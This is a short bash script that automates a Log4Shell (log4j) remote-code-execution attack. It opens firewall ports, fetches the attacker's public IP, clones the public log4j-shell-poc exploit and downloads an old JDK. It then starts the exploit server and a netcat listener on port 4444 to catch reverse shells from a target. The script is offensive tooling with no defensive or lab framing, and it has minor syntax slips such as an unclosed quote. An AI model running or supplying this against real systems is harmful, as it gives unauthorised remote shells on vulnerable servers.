#!/bin/bash
#kali
#remember to port-forward if setup in home


echo "./exploit-script-remote <1: desktop | cloud>
echo "remember to portforward or open your firewall"

if [ -z "$1" ] ; then
    echo "please supply desktop or cloud" 
    exit 0
fi


sudo ufw allow 8000
sudo ufw allow 4444

var_my_ip=$(curl -i ipinfo.io | grep "ip\"" | awk -F '\"' '{print $4}')


sudo apt-get update
sudo apt-get install -y python-pip3 python-pip


if [ "$1" == "desktop" ] ; then
cd Desktop
elif [ "$1" == "cloud" ] ; then
cd ~/
fi

git clone https://github.com/kozmer/log4j-shell-poc
cd log4j-shell-poc
pip install -r requirements.txt
pip3 install -r requirements.txt
wget https://packages.baidu.com/app/jdk-8/jdk-8u111-linux-x64.tar.gz

tar -xvf jdk-8u111-linux-x64.tar.gz
sed -i 's/jdk1.8.0.20/jdk1.8.0_111/g' poc.py


python3 poc.py --userip $var_my_ip --webport 8000 --lport 4444 & 

echo "listening 4444, type the payload to your target"
nc -nlvp 4444
